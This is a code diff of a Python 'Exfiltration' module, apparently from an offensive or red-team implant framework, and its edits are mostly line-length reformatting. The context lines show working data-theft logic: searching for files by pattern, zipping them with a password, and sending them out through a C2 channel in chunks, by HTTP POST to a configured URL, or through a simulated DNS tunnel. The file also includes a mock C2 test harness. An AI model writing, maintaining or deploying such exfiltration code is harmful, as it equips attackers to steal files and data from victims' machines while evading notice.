@@ -41,7 +41,8 @@ class Exfiltration:
         self.logger = logging.getLogger(__name__)
         if not command_control_module:
             self.logger.warning(
-                "Exfiltration module initialized WITHOUT CommandControl module. Exfil via C2 will fail."
+                "Exfiltration module initialized WITHOUT CommandControl module. "
+                "Exfil via C2 will fail."
             )
 
     def update_config(self, config: Dict[str, Any]):
@@ -79,9 +80,8 @@ class Exfiltration:
                 result["results"][method] = exfil_result
                 if exfil_result.get("status") == "failure":
                     result["status"] = "partial_success"
-                    errors.append(
-                        f"Method '{method}' failed: {exfil_result.get('details', {}).get('error', 'Unknown reason')}"
-                    )
+                    err_reason = exfil_result.get("details", {}).get("error", "Unknown reason")
+                    errors.append(f"Method '{method}' failed: {err_reason}")
             except Exception as e:
                 error_msg = f"Exfiltration method '{method}' failed: {e}"
                 errors.append(error_msg)
@@ -124,7 +124,9 @@ class Exfiltration:
             patterns = [patterns]
 
         self.logger.info(
-            f"Starting file collection. Paths: {paths_to_search}, Patterns: {patterns}, MaxFiles: {max_files}, MaxFileSizeKB: {max_size_kb}, MaxTotalKB: {max_total_kb}"
+            "Starting file collection. "
+            f"Paths: {paths_to_search}, Patterns: {patterns}, MaxFiles: {max_files}, "
+            f"MaxFileSizeKB: {max_size_kb}, MaxTotalKB: {max_total_kb}"
         )
 
         for start_path_str in paths_to_search:
@@ -179,13 +181,14 @@ class Exfiltration:
                     file_size_kb = file_size_bytes / 1024.0
 
                     if file_size_kb > max_size_kb:
-                        # self.logger.debug(f"Skipping {item_path} (size {file_size_kb:.2f}KB > max {max_size_kb}KB)")
+                        # skipped: size exceeds max_file_size_kb
                         skipped_files.append(f"{item_path} (Too Large)")
                         continue
 
                     if (total_size_kb + file_size_kb) > max_total_kb:
                         self.logger.warning(
-                            f"Reached max total size ({max_total_kb}KB). Cannot add {item_path}. Stopping collection."
+                            f"Reached max total size ({max_total_kb}KB). "
+                            f"Cannot add {item_path}. Stopping collection."
                         )
                         skipped_files.append(f"{item_path} (Exceeds Total Limit)")
                         break  # Stop processing this path
@@ -205,8 +208,12 @@ class Exfiltration:
             if len(collected_files) >= max_files or total_size_kb >= max_total_kb:
                 break  # Stop searching other paths if limits reached
 
+        n_col = len(collected_files)
+        n_skip = len(skipped_files)
         self.logger.info(
-            f"File collection finished. Collected {len(collected_files)} files, Total Size: {total_size_kb:.2f}KB. Skipped {len(skipped_files)} files. Checked {checked_count} items."
+            f"File collection finished. Collected {n_col} files, "
+            f"Total Size: {total_size_kb:.2f}KB. Skipped {n_skip} files. "
+            f"Checked {checked_count} items."
         )
         return collected_files, total_size_kb, skipped_files
 
@@ -231,7 +238,7 @@ class Exfiltration:
         error_msg = ""
 
         try:
-            # Copy files to staging - preserving relative paths could be complex, simple copy for now
+            # Copy files to staging; relative path layout is simplified (basename only).
             staged_files_map = {}
             for file_path_str in file_list:
                 try:
@@ -261,7 +268,7 @@ class Exfiltration:
                 self.logger.info(f"Creating zip archive: {archive_path}")
                 with zipfile.ZipFile(archive_path, "w", compression=compression_level) as zipf:
                     if archive_password:
-                        # Note: zipfile's built-in encryption is weak. Consider external tools for strong encryption.
+                        # Note: zipfile encryption is weak; use external tools for strong crypto.
                         zipf.setpassword(archive_password.encode())
                         self.logger.info("Applying password protection to zip (basic).")
                     for original_path, staged_path in staged_files_map.items():
@@ -344,7 +351,8 @@ class Exfiltration:
                 if len(collected_files) > 1:
                     # TODO: Handle exfil of multiple individual files (queue them all?)
                     self.logger.warning(
-                        "Exfil of multiple individual files via C2 not fully implemented yet. Sending first file only."
+                        "Exfil of multiple individual files via C2 not fully implemented yet. "
+                        "Sending first file only."
                     )
                 source_path_to_read = collected_files[0]
                 result_details["file_sent"] = source_path_to_read
@@ -395,7 +403,8 @@ class Exfiltration:
                                     )
 
                             self.logger.debug(
-                                f"Queued chunk {chunk_index} for {file_basename} ({len(chunk)} bytes) for C2 exfil."
+                                f"Queued chunk {chunk_index} for {file_basename} "
+                                f"({len(chunk)} bytes) for C2 exfil."
                             )
                             result_details["exfil_data_queued"] = True
                             result_details["chunks_sent_count"] = chunk_index
@@ -404,7 +413,8 @@ class Exfiltration:
 
                     status = "success"
                     self.logger.info(
-                        f"Successfully read and queued {chunk_index} chunks ({bytes_sent} bytes) from {file_basename} for exfil via C2."
+                        f"Successfully read and queued {chunk_index} chunks "
+                        f"({bytes_sent} bytes) from {file_basename} for exfil via C2."
                     )
 
                 except FileNotFoundError:
@@ -511,7 +521,8 @@ class Exfiltration:
 
             # 3. Send via HTTP POST
             self.logger.info(
-                f"Attempting to exfiltrate archive {staged_archive_path} via HTTP POST to {http_post_url}"
+                f"Attempting to exfiltrate archive {staged_archive_path} "
+                f"via HTTP POST to {http_post_url}"
             )
             headers = details.get("headers", {})
             # Use a default content type if none provided
@@ -536,8 +547,9 @@ class Exfiltration:
                     result_details["response_snippet"] = response.text[
                         :200
                     ]  # Log beginning of response
+                    rc = response.status_code
                     self.logger.info(
-                        f"Successfully POSTed archive to {http_post_url}. Status: {response.status_code}"
+                        f"Successfully POSTed archive to {http_post_url}. Status: {rc}"
                     )
 
                 except requests.exceptions.RequestException as req_err:
@@ -608,8 +620,9 @@ class Exfiltration:
             collected_files, total_kb, skipped = self._collect_files(details)
             if not collected_files:
                 raise FileNotFoundError("No files collected for exfiltration.")
+            nskip = len(skipped)
             self.logger.info(
-                f"Collected {len(collected_files)} files ({total_kb:.2f} KB). Skipped {len(skipped)}."
+                f"Collected {len(collected_files)} files ({total_kb:.2f} KB). Skipped {nskip}."
             )
 
             # Step 2: Stage and Archive
@@ -640,8 +653,10 @@ class Exfiltration:
 
                 # Check FQDN length constraints (max 253 total, max 63 per label)
                 if len(fqdn) > 253:
+                    fq_preview = fqdn[:100]
                     self.logger.warning(
-                        f"Skipping query, generated FQDN too long ({len(fqdn)} chars): {fqdn[:100]}..."
+                        f"Skipping query, generated FQDN too long ({len(fqdn)} chars): "
+                        f"{fq_preview}..."
                     )
                     failed_queries += 1
                     continue
@@ -677,10 +692,17 @@ class Exfiltration:
 
             if simulated_queries > 0 and failed_queries < simulated_queries:
                 status = "success"  # Assume success if most queries simulated without error
-                reason = f"Simulated {simulated_queries} DNS queries for {len(encoded_data)} chars of data. {failed_queries} queries failed lookup (may be expected)."
+                ec_len = len(encoded_data)
+                reason = (
+                    f"Simulated {simulated_queries} DNS queries for {ec_len} chars of data. "
+                    f"{failed_queries} queries failed lookup (may be expected)."
+                )
                 self.logger.info("DNS Tunnel simulation finished.")
             else:
-                reason = f"DNS Tunnel simulation failed. Attempted {simulated_queries} queries, {failed_queries} failed."
+                reason = (
+                    f"DNS Tunnel simulation failed. Attempted {simulated_queries} queries, "
+                    f"{failed_queries} failed."
+                )
                 self.logger.error(reason)
 
         except FileNotFoundError as e:
@@ -750,9 +772,11 @@ if __name__ == "__main__":
             self.logger = logging.getLogger("MockC2")
 
         def queue_outgoing_data(self, data: Dict[str, Any]):
-            self.logger.info(
-                f"[MockC2] Queued outgoing data: { {k: v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v for k, v in data.items()} }"
-            )
+            def _truncate(v):
+                return v[:50] + "..." if isinstance(v, str) and len(v) > 50 else v
+
+            preview = {k: _truncate(v) for k, v in data.items()}
+            self.logger.info(f"[MockC2] Queued outgoing data: {preview}")
             self.outgoing_queue.append(data)
 
         def get_queued_data(self):
@@ -805,7 +829,8 @@ if __name__ == "__main__":
         result1 = exfil_module.run_exfiltration(exfil_request_1)
         print(json.dumps(result1, indent=2))
         print(f"Mock C2 Queue length: {len(mock_c2.get_queued_data())}")
-        # print(f"First chunk data (first 50 chars): {mock_c2.get_queued_data()[0].get('data_b64', '')[:50]}")
+        # qb64 = mock_c2.get_queued_data()[0].get("data_b64", "")[:50]
+        # print(f"First chunk data (first 50 chars): {qb64}")
         mock_c2.outgoing_queue.clear()  # Clear queue for next test
 
         # --- Test Case 2: Collect log file (too large), should be skipped ---
